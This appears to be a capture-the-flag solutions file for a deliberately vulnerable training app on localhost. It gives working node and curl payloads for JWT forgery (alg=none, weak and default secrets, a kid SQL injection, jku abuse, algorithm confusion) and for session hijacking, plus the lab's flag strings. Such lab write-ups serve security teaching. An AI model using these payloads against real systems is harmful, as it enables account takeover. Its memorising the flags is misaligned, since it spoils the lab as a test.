# Batch 07 solutions: JWT Attacks + Session Management

> Lab-only. Every payload below targets the intentionally vulnerable training app
> on localhost. Base URL used here: `http://localhost:3000` (adjust the port to
> match your run).

## jwt – JWT Attacks

**1. alg=none Accepted** – `PENTRIX{jwt_none-admin}`

Build an unsigned token by hand. Header `{"alg":"none","typ":"JWT"}` and payload
`{"user":"guest","role":"admin"}`, base64url-encoded, joined with dots and an
empty third segment:

```
node -e "
const b64u = o => Buffer.from(JSON.stringify(o)).toString('base64url');
const t = b64u({alg:'none',typ:'JWT'}) + '.' + b64u({user:'guest',role:'admin'}) + '.';
console.log(t);"
```

Paste the token into the form at `/jwt/none` and submit.

Why it works: the verifier treats `alg=none` as legitimate and checks only the
claims, so a self-written token with `role: admin` is accepted with no signature.

**2. Weak HMAC Secret** – `PENTRIX{jwt_weak-secret}`

Grab the guest token from `/jwt/weak` and decode it to confirm `alg` is `HS256`.
The secret is the guessable default `secret123`. Forge an admin token offline:

```
node -e "
const jwt = require('jsonwebtoken');
console.log(jwt.sign({user:'guest',role:'admin'}, 'secret123', {algorithm:'HS256'}));"
```

Submit it at `/jwt/weak`.

Why it works: HS256 security rests entirely on the secret, and a weak secret can
be guessed, letting anyone mint validly signed tokens.

**3. SQL Injection in kid Lookup** – `PENTRIX{jwt_kid-sqli}`

The server runs `SELECT key FROM jwt_keys WHERE kid='<kid from token>'` and
verifies your token with whatever key comes back. Inject through the `kid`
header so the query returns a key you chose:

```
node -e "
const jwt = require('jsonwebtoken');
const myKey = 'attackerkey1';
const kid = \"zzz' UNION SELECT '\" + myKey;
console.log(jwt.sign({user:'guest',role:'admin'}, myKey,
  {algorithm:'HS256', header:{kid}}));"
```

Submit the token at `/jwt/kid`.

Why it works: the interpolated `kid` lets you UNION in your own key, so the
server verifies your token against a secret you control.

**4. Untrusted jku Key Server** – `PENTRIX{jwt_jku}`

First publish your own key on the in-lab attacker key server. At
`/jwt/attacker-keys`, register kid `evil` with secret `evilsecret` (the page then
shows your JWKS URL, e.g. `http://localhost:3000/jwt/attacker-keys/jwks?kid=evil`).
Then mint a token whose `jku` header points at it:

```
node -e "
const jwt = require('jsonwebtoken');
console.log(jwt.sign({user:'guest',role:'admin'}, 'evilsecret', {algorithm:'HS256',
  header:{kid:'evil', jku:'http://localhost:3000/jwt/attacker-keys/jwks?kid=evil'}}));"
```

Submit it at `/jwt/jku`. (Adjust the host/port in `jku` to match your run.)

Why it works: the verifier fetches any `jku` URL with no allowlist and trusts
the keys it finds, so pointing it at your own key server hands you the signing key.

**5. RS256 / HS256 Algorithm Confusion** – `PENTRIX{jwt_alg-confusion}`

Copy the RSA public key from `/jwt/confusion-pubkey`. When the server sees
`alg: HS256` it uses the public key bytes as the HMAC secret, and the public key
is public. Sign an HS256 token with those bytes as the key:

```
node -e "
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
(async () => {
  const html = await (await fetch('http://localhost:3000/jwt/confusion-pubkey')).text();
  const pem = html.match(/<pre>([\s\S]*?)<\/pre>/)[1];
  console.log(jwt.sign({user:'guest',role:'admin'},
    crypto.createSecretKey(Buffer.from(pem)), {algorithm:'HS256'}));
})();"
```

Submit it at `/jwt/confusion`.

Why it works: the server confuses an asymmetric public key with a symmetric HMAC
secret, so the published public key becomes a valid signing key for HS256 tokens.

**6. Expiry Never Checked** – `PENTRIX{jwt_no-expiry}`

Copy the expired admin token shown on `/jwt/noexpiry` (it expired an hour ago)
and paste it into the form on the same page unchanged.

Why it works: the verifier passes `ignoreExpiration`, so the `exp` claim is
never enforced and a leaked old token replays forever.

**7. Audience Not Validated** – `PENTRIX{jwt_aud-bypass}`

Copy the partner token from `/jwt/aud`. It carries `"aud": "billing-service"` and
`role: admin`. Submit it at the same page's login form.

Why it works: the server verifies the signature but never checks the `aud`
claim, so a token minted for a different service is accepted here.

**8. Default Key for Missing kid** – `PENTRIX{jwt_kid-default}`

Tokens without a `kid` header fall back to the hardcoded default key `test`.
Sign a kid-less admin token with it:

```
node -e "
const jwt = require('jsonwebtoken');
console.log(jwt.sign({user:'guest',role:'admin'}, 'test', {algorithm:'HS256'}));"
```

Submit it at `/jwt/kiddefault`.

Why it works: the missing-kid fallback uses a predictable hardcoded secret, so
anyone who guesses it can mint valid tokens without a `kid` at all.

## session – Session Management

All labs use the cookie name `lab_sid`. Use a cookie jar so ids persist:
`curl -c jar -b jar ...`.

**1. Session Fixation** – `PENTRIX{session_fixation}`

Fix the session id before login, then log in as `admin` / `admin123`:

```
curl -c jar -b jar http://localhost:3000/session/fixation/preset -o /dev/null
curl -c jar -b jar --data-urlencode "username=admin" --data-urlencode "password=admin123" \
  http://localhost:3000/session/fixation/login
```

The login response shows the flag and the cookie is still `attacker123`.

Why it works: the server keeps the pre-login session id instead of regenerating
it at login, so an attacker-chosen id becomes the victim's authenticated session.

**2. Logout Does Not Destroy the Session** – `PENTRIX{session_logout}`

```
curl -c jar -b jar --data-urlencode "username=admin" --data-urlencode "password=admin123" \
  http://localhost:3000/session/logoutdemo/login -o /dev/null
curl -b jar http://localhost:3000/session/logoutdemo/logout -o /dev/null
curl -b jar http://localhost:3000/session/logoutdemo/secret
```

The secret page still opens after logout and shows the flag.

Why it works: logout only flips a flag on the server-side session instead of
deleting it, so the old cookie keeps working.

**3. Predictable Session IDs** – `PENTRIX{session_predictable}`

```
curl -c jar http://localhost:3000/session/predictable
```

The page shows your id (e.g. `1000`) and the admin's id right after yours
(e.g. `1001`). Set the admin's value as your cookie and open the admin panel:

```
curl -b <(printf 'localhost\tFALSE\t/\tFALSE\t0\tlab_sid\t1001\n') \
  http://localhost:3000/session/predictable/admin
```

(Replace `1001` with the admin id shown on your page.)

Why it works: session ids are sequential integers, so the admin's session id is
trivially guessable from your own.

**4. Session ID in the URL** – `PENTRIX{session_url}`

Visit `/session/urldemo` (this also seeds the admin's visit), then read the
proxy log at `/session/urldemo/proxy-log` and find the admin's URL:

```
GET /session/urldemo/home?sid=9dd444934bd24bb3367d3dd5bb30f089
```

Open that URL verbatim:

```
curl "http://localhost:3000/session/urldemo/home?sid=<admin-sid-from-log>"
```

Why it works: putting the sid in the URL leaks it into logs, and anyone who can
read the proxy log can replay the admin's session.

**5. Sessions Never Expire** – `PENTRIX{session_never-expires}`

Open `/session/legacy-archive` and copy the decade-old admin session id. Set it
as your `lab_sid` cookie and visit the legacy panel:

```
curl -b <(printf 'localhost\tFALSE\t/\tFALSE\t0\tlab_sid\t<archived-sid>\n') \
  http://localhost:3000/session/legacy-admin
```

Why it works: sessions live for 10 years, so a stolen session from a decade ago
is still accepted.

**6. Session ID in Debug Log** – `PENTRIX{session_log-leak}`

Open `/session/debug-log` and find the line `admin session started sid=<id>`.
Replay it as your cookie:

```
curl -b <(printf 'localhost\tFALSE\t/\tFALSE\t0\tlab_sid\t<sid-from-log>\n') \
  http://localhost:3000/session/leak-admin
```

Why it works: verbose debug logging writes live session ids to a readable log,
handing the admin's session to anyone who looks.
